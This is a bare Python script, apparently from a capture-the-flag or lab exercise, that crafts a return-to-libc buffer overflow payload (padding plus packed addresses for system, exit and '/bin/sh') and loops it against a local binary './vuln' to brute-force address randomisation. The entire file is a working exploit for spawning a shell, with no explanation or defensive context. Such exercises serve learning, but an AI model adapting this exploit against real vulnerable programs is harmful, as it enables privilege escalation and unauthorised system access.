#!/usr/bin/python
import struct
import subprocess

base=0xf7e07a60
while(True):
    exit=base+0
    system=base+53120
    binsh=base+1364042

    padding = 'A'*140
    system_code = struct.pack('I',system)
    exit_code   = struct.pack('I',exit)
    binsh_code  = struct.pack('I',binsh)

    payload = padding + system_code + exit_code + binsh_code

    # print padding + system_code + exit_code + binsh_code

    subprocess.call(['./vuln', payload])
